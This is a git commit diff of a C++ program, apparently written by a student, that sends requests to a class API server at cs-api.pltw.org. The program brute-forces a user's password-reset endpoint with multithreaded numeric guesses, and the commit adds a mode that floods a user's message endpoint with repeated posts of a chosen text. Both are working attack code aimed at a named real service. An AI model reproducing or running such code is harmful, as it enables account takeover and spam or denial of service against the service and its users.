5bd812d0bde3b4d45054055d39f4cc982e45107f
ToneTest <160059734+ToneTest0226@users.noreply.github.com>
2024-11-18 10:35:59 -0900

    its not threads but yk it works

--- Current Project/SendReq.cpp
+++ Current Project/SendReq.cpp
@@ -14,8 +14,10 @@
 #include <vector>
 #include <chrono>
 #include "httplib.h"
+#include <sstream>
 
-
+auto start = std::chrono::system_clock::now();
+auto stop = std::chrono::system_clock::now();
 //send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
 // WEBSITE IS https://cs-api.pltw.org/
 // Thx for the lib, its at https://github.com/yhirose/cpp-httplib
@@ -33,15 +35,19 @@ int guess();
 int guessup();
 int randomnumberUP = 990;
 int menuswitch;
+int FloodTimes();
+int FloodMessages();
 int randomnumberDOWN = 10015;
 
+std::string Flood;
+
 int menu(){
-    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Down By One(9999 -> 9998)" << "\n4:Do all" << "\n Select:";
+    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Down By One(9999 -> 9998)" << "\n4:Do all" << "\n5:Flood Messages" << "\n Select:";
     std::cin >> menuswitch;
     switch(menuswitch){
         case 1:{
         int numthreads;
-        std::cout << "How many threads:";
+        std::cout << "How many processes:";
         std::cin >> numthreads;
          std::vector<std::thread> threads;
         for (int i = 0; i < numthreads; ++i){
@@ -54,8 +60,9 @@ int menu(){
         
         case 2:{
         int numthreads;
-        std::cout << "How many threads:";
+        std::cout << "How many processes:";
         std::cin >> numthreads;
+        auto start = std::chrono::system_clock::now();
          std::vector<std::thread> threads;
         for (int i = 0; i < numthreads; ++i){
             threads.push_back(std::thread(guessup));
@@ -67,8 +74,9 @@ int menu(){
 
         case 3:{
         int numthreads;
-        std::cout << "How many threads:";
+        std::cout << "How many processes:";
         std::cin >> numthreads;
+        auto start = std::chrono::system_clock::now();
          std::vector<std::thread> threads;
         for (int i = 0; i < numthreads; ++i){
             threads.push_back(std::thread(guessdown));
@@ -80,17 +88,19 @@ int menu(){
 
         case 4:{
         int numthreads;
-        std::cout << "How many threads:";
+        std::cout << "How many processes:";
         std::cin >> numthreads;
+        auto start = std::chrono::system_clock::now();
          std::vector<std::thread> threads;
         for (int i = 0; i < numthreads; ++i){
             if (i % 3 == 0){
-                threads.push_back(std::thread(guess));
+                threads.push_back(std::thread(guessup));
             } else if (i % 2 == 0){
                 threads.push_back(std::thread(guessdown));
             }
             else {
-                threads.push_back(std::thread(guessup));
+                threads.push_back(std::thread(guess));
+                
             }
         }
         for (auto &th : threads){
@@ -98,6 +108,24 @@ int menu(){
         }
         break;
     }
+        case 5:{
+        int numthreads;
+        std::cin.ignore();
+        std::cout << "Whats the message:";
+        std::getline(std::cin, Flood);
+        std::cout << "\nHow many processes:";
+        std::cin >> numthreads;
+        auto start = std::chrono::system_clock::now();
+         std::vector<std::thread> threads;
+        for (int i = 0; i < numthreads; ++i){
+            threads.push_back(std::thread(FloodTimes));
+        }for (auto &th : threads){
+            th.join();
+        }
+        }
+        break;
+
+
         default:
          std::cout << "Invalid option, please try again.\n";
          menu();
@@ -111,11 +139,10 @@ int guess(){
     unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
         srand(seed);
         randomnumber = rand() % randomnumberDOWN + randomnumberUP;
-    std::cout << "Password Being Tried:" << randomnumber << "\n";
+   // std::cout << "Password Being Tried:" << randomnumber << "\n";
      SendReq();
      }else{
         std::cout << "Done. Didnt unlock it?\n";
-         exit(0);
      }
      return(0);
 }
@@ -124,7 +151,7 @@ int guessup(){
     if (amntoftimes != 0){
      amntoftimes -= 1;
      randomnumberUP += 1; 
-     std::cout << "Password Being Tried (+1):" << randomnumberUP << "\n";
+     //std::cout << "Password Being Tried (+1):" << randomnumberUP << "\n";
      SendReqUP();
     }
     return(0);
@@ -134,22 +161,39 @@ int guessdown(){
     if(amntoftimes != 0){
     amntoftimes -= 1;
     randomnumberDOWN -= 1;
-    std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
+    //std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
     SendReqDown();
        }
        return(0);
 }
 
+int FloodTimes(){
+    if(amntoftimes != 0){
+    amntoftimes -= 1;
+    //std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
+    FloodMessages();
+       }
+       return(0);
+
+}
+
 int SendReqUP(){
     httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
-    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberUP);
-    auto res = client->Post(endpoint.c_str(), "", "text/plain");
+    std::ostringstream endpoint;
+     endpoint << "/" << USERP << "/reset?password=" << (randomnumberUP);
+    auto res = client->Post(endpoint.str(), "", "text/plain");
 
     if (res){
-        std::cout << "Response" << res->body << "\n";
+      //  std::cout << "Response" << res->body << "\n";
          if(res->body.find(USERP) != std::string::npos){
           std::cout << "Password reset successful for user " << USERP << ".\n";
-            exit(0); }
+          std::cout << "Password Last Tried(May not be right) (+1):" << randomnumberUP << "\n";
+            auto end = std::chrono::system_clock::now();
+            std::chrono::duration<double> elapsed_seconds = end-start;
+            std::time_t end_time = std::chrono::system_clock::to_time_t(end);
+            std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl; 
+            exit(0);
+            }
     }else{
         std::cerr << "Request Failed. (Rate limited?)\n";
     }
@@ -160,14 +204,21 @@ int SendReqUP(){
 
 int SendReqDown(){
     httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
-    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberDOWN);
-    auto res = client->Post(endpoint.c_str(), "", "text/plain");
+    std::ostringstream endpoint;
+     endpoint << "/" << USERP << "/reset?password=" << (randomnumberDOWN);
+    auto res = client->Post(endpoint.str(), "", "text/plain");
 
     if (res){
-        std::cout << "Response" << res->body << "\n";
+       // std::cout << "Response\n" << res->body << "\n";
          if(res->body.find(USERP) != std::string::npos){
           std::cout << "Password reset successful for user " << USERP << ".\n";
-            exit(0); }
+          std::cout << "Password Last Tried(May not be right) (-1):" << randomnumberDOWN << "\n";
+            auto end = std::chrono::system_clock::now();
+            std::chrono::duration<double> elapsed_seconds = end-start;
+            std::time_t end_time = std::chrono::system_clock::to_time_t(end);
+            std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl; 
+            exit(0);
+            }
     }else{
         std::cerr << "Request Failed. (Rate limited?)\n";
     }
@@ -176,16 +227,34 @@ int SendReqDown(){
     return res ? res->status : -1;
 }
 
+int FloodMessages(){
+    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
+    std::ostringstream endpoint;
+     endpoint << "/" << USERP << "?text=" << (Flood);
+    auto res = client->Post(endpoint.str(), "", "text/plain");
+
+    delete client;
+        FloodTimes();
+    return(0);
+}
+
 int SendReq(){
     httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
-    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
-    auto res = client->Post(endpoint.c_str(), "", "text/plain");
+    std::ostringstream endpoint;
+     endpoint << "/" << USERP << "/reset?password=" << (randomnumber);
+    auto res = client->Post(endpoint.str(), "", "text/plain");
 
     if (res){;
-        std::cout << "Response" << res->body << "\n";
+       //std::cout << "Response" << res->body << "\n";
          if(res->body.find(USERP) != std::string::npos){
           std::cout << "Password reset successful for user " << USERP << ".\n";
-            exit(0); }
+          std::cout << "Password Last Tried(May not be right):" << randomnumber << "\n";
+            auto end = std::chrono::system_clock::now();
+            std::chrono::duration<double> elapsed_seconds = end-start;
+            std::time_t end_time = std::chrono::system_clock::to_time_t(end);
+            std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl;
+            exit(0);
+            }
     }else{
         std::cerr << "Request Failed. (Rate limited?)\n";
     }
@@ -207,6 +276,5 @@ return(0);
 
 int main(){
 GetUserNameAndAmount(); 
-
 return(0);
 }
